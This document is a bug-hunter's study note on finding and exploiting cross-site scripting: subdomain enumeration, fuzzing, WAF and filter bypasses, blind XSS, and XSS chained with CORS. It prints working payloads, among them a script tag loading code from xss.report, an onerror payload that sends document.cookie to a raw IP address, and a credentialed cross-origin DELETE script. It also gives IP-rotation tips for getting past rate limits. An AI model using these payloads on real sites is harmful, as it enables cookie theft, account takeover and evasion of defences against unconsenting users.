# Client side injection(XSS)
* It's mainly looking for endpoints manully for every domain bcuz the tool that is used in linux will be used many times and many testing will be done try manually searching for endpoints
## Hunting strategies
1. Reflected inputs in Unauthenticated routes
    * This is for apps with lot of subdomains
    * we focus on finding hidden sub-domains and endpoints
    * Vast majority of them will be fuzzed to death so we focus on finding hidden sub-domains and endpoints
    * They can identified by web scanners
2. Reflected inputs in authenticated routes 
    * Here also we focus on hidden enpoints or hidden fuctionalities
3. DOM injection
## Componsentaing controls
1. Client-side validation
2. Server-side validation
3. WAF(Webapplication firewall)
4. Cookie flag(HTTP only flag)
5. CSP(Content security policy)
6. Encoding
7. Browser security header
## Reflected inputs in Unauthenticated routes
### Before attacking
1. Collect sub-domains from sources u can use rson framework for that, which also sorts live sub-domains
2. Then classify them into different list through the response
    * No functinality - nothing in page
    * Restricted access(Forbidden) - 403 or 401 status code
    * API - with 404 response to root directory
    * External services login page - basically it is external services used like microsoft 
    * Internal services login page - internally developed page for something like adminstration
    * Full app with authentication  
* We can use screenshot in enumeration section of rson framework
3. Then go through them one by one to find endpoints for xss
### Step 1-Try to Find attack surface(Endpoints/parameters)
1. Finding endpoints in no functionality sub-domains
    * Mainly u do fuzzing in two different ways 
        1. One using Param miner to fuzz for endpoints(guess parameters) and u will see result in dashboard
        2. second check for directory and also random headers fuzzing using intruder with seclist payloads
            1. For directory discovery use raft lists in `discovery/webcontent`
            2. For random headers fuzzing use standard and non-standard in `miscellenous/web/httprequestheaders`
    * And if u see something pops up different try to play around and manually test 
    * Seclist payloads that can be used are `header_list,raft_list`,`/fuzzing-unicode,uri-hex`
2. Finding targets in restricted access domains
    * If we bypass the 403 it is itself a bug so after bypassing we can try to find endpoints too
    * It is typically a access control bypass, U can use 403 bypass or hacktricks.com to manually test to bypass
3. Finding targets in api subdomains
    * Mainly u do fuzzing in two different ways 
        1. One using Param miner to fuzz for endpoints(guess parameters) and u will see result in dashboard
        2. second check for directory and also random headers fuzzing using intruder with seclist payloads
            1. u can use api-seen-in-wild and api-endpoints under `web/api`
    * U can check for api documentaion from google
* When u find endpooint positive try to guess parameters using param-miner 
* So after this if u find any endpoint or parameter with positive response u can check if they are being reflected in response and if not try manually playing with request like changing http method and again fuzz with that method or removing header
4. Finding targets in Full Application
    * U need to crawl through the application burp scan as unauthenticated
    * Try same above things fuzzing for endpoints and parameters
### Step 2-Try to find reflected inputs in response using scanner
* Building custom scanner for finding reflected inputs
    1. Select all the subdomains in mapping and select scan
    2. Then select audit selected items
    3. come to scan config and create new scan
    4. Creating new scan
        1. select Thorough and minimize false negative in audit optimization
        2. select individual report and select all and disable all and select input returned alland link manipulation in scan report
        3. put 250 for audit fail and 150 to pause the task in error audit
### After finding reflected inputs
* Finding a good reflected inputs(eliminating not so useful)
    * Request from url parameter and post parameters are the only good enpoints for xss
    * Respose with json content type is not so useful
#### Check for compensenting controls after finding good enpoints
3. WAF(Webapplication firewall)
    * Some common WAF 
        ```Amazon Cloudfront
            Cloudflare
            Imperva
            Akamai kona site defender
            F5 Advanced WAF
            Barracuda Web Application Firewall
            Fortinet FortiWeb
            Microsoft Azure Web Application Firewall
            Radware AppWall
            Sucuri WAF
            ```
    * See the forbidden resoponse to find out waf most of the times it will be cloudfront
    * see in awesome waf github for ways to detect or bypass waf
    * Try 
4. Cookie flag(HTTP only flag)
    * Open browser and login as authenticated user then open cookies section
    * In cookies sort it with flags and session
5. CSP(Content security policy)
    * See csp in response and see if it is report-only
7. Browser security header
    * See for response with headers like 
        * xss-protection, it can have 0,1 or 2, 1 means safe
        * Or x-frame,cache-control
6. Output Encoding
    * See if the reflected special character is url encoded 
1. Client-side validation
    * See inputing different characters in website and if it show any exception
2. Server-side validation
    * Like black listing(filtering out listed chracters),white listing(Just allowing listed characters)
    * See inputing different characters in Proxy(repeater) and if it strips it in any way
#### After finding compensating controls
1. Output encoding
    * Try to go through all character in fuzz dir of seclist to identify which are being encoded and which aren't
    * Also try to throw different encoded characters in fuzz to bypass
    * try to put some fuzzing character(in fuzz/naughty characters) before the encoding character like `rson$????????$"`
2. WAF bypass 
    * Try to put simple `<script>` tag and see if it cacthes it
    * then try to use other tags like img,a,svg and other..., to do this use portswigger by copying all the tags and using intruder and then u can select that tag and get payload
    * Use OWASP cheat sheet and portswigger cheatsheet to get payload of different tags
    * Try to change case of letters,open tag twice and add `+` b/w tag name or use `%0a` which \r\n negleted
3. Serverside validation(Filtering)
    * If in attribute context if "(double quote) is filtered try escapeing the escape character(//) or encoding
## XSS Tips
* The location where the input is reflected is very useful in determineing payload and how u can weaponize xss
    * Different XSS contexts
        1. In b/w html tags
        2. In html attributes
        3. In js
* If any endpoint seems to be properly validated jump to nxt don't invest ur time on it
* Try using prompt or confirm insted of alert
* The response content-type should be in text/html
* Finding reflected inputs in 404 response is just a cannot get error page which most likely not a better surface but if it is a custom built 404 page u can try once 
* Don't forget to encode
* To bypass CSP if it allows script to run from other source(Script-src: *) so we can use blind xss technique 
    * U can use csp evaluator
* Always try adding &random=parameter to get request to see how’s it being handled
## Blind XSS
* It is smiliar to stored xss but we are just aiming at companies systems like support team or any other who uses to monitor the sent data with there company account
* To find this xss u need to look for endpoint which passes data to there system like contact us or support team or user data used to moitor some kind of stuff
* like u can replace user agent into payload like `'";/></textarea></script><script src=https://xss.report/c/takimichi>`
so if user agent data is used as moitoring data likely of getting blind xss
* The above payload can be breakdowned 
    * First we are assuming we are in script tag of variable init so we use `'";` to break it
    * if not above then we assume it to be in a input tag `/>` to break input tag
    * then </textara></script> assuming in script or textarea tag then rendering our payload
    * differnt situation where this can't work is when there is a proper validation like escaping or filtering or output encoding(most difficult to break)
## Exploiting XSS
1. Xss to steal cookies
    * Possible breaks
        * Victim might not be logged in 
        * Possible http flag
        * Session cookie can be locked to ip
        * Session might be timed out
    * Steps to do 
        * First get a webhook using webhook.site to get the cookie
        * then get a payload like `<img src=x onerror=this.src='http://34.211.174.102/?c='+document.cookie>`
        * after it executes u will get the response in webhook

2. XSS to steal passwords
    * If only user has enabled autofill
    * Password will be fill into script 
3. XSS to steal CSRF token
4. Change an email address
    * then request password reset > account takeover
5. Delete user data in his session
## WAF Bypass(GENERAL-Rate limiting) 
- Request size limit 
    * Every waf contains a size limit for request body so having long payload can possibly bypass the waf
    * Refer kloudle and nowafpls for size limit chart and how it works
- Rotating IP to bypass rate limit or waf for burp intruder attacks
    * We can use iprotate with aws api gateway ip pool 
    * Or we can manual rotate ip by vpn
- Rotating IP to bypass rate limit or waf for linux like fuzzing or nuclei template
    * Shadow clone can be used to rotate ip with aws credentials
## WAf Bypass(XSS)    
- new js events released are not added to blacklist
 * like `<input type="hidden" oncontentvisibilityautostatechange="alert(/CanaryChrome/)" style="content-visibility:auto">`
- While exploiting document.cookie might be blocked
    * Then u can use only cookie insted
    * or document[cookie]
## CORS misconfiguration
* It is cross origin request where application decides which origin will be able to make a request to specific domain
* Application uses different response header to decide this like
    * Allow-control-Allow-origin
        * Finding CORS miscongfig(Only in sensitive endpoints): just try to change origin to different subdomain and see it allows credentials
    * Allow-control-Allow-credentials: True or False
    * Allow-control-Allow-Methods
* It will be helpful in chainging to XSS where XSS in no functionality can be able exploited with good functionality main domain(like delete request in main domain) when app allow cors request
### XSS chained to CORS
* Payload chain xss and cors
* `<button type="submit" onclick=sendReq()>Submit</button>
<script>
function sendReq(){
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('delete','http://cors.bepractical.tech/api/user/   delete',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
}
</script>`
### RXSS in Laravel framework
* If u find a website laravel framework then u can check for RXSS
* There is chance of XSS if debug mode is on in `/_ignition/execute-solution`
* Payload - `/_ignition/scripts/--%3E%3Csvg%20onload=alert('cappriciosec.com')%3E`
### Flow in the backend to protect the website from payload
* WAF(Blacklist->regex)->server-side filtering->then reflect
* In this sceniro go step wise bypassing every step and utilizing server-side filter for our advantage
    - First find out the context and pass the full payload 
    - next find out the blacklisted elements and bypass the blacklist
    - then if it is using regex to block like `on(regex)` and filtering `",>,<` this elements
    - no can create a payload like `value="" type=image src=x on>error=aler>t(1)`
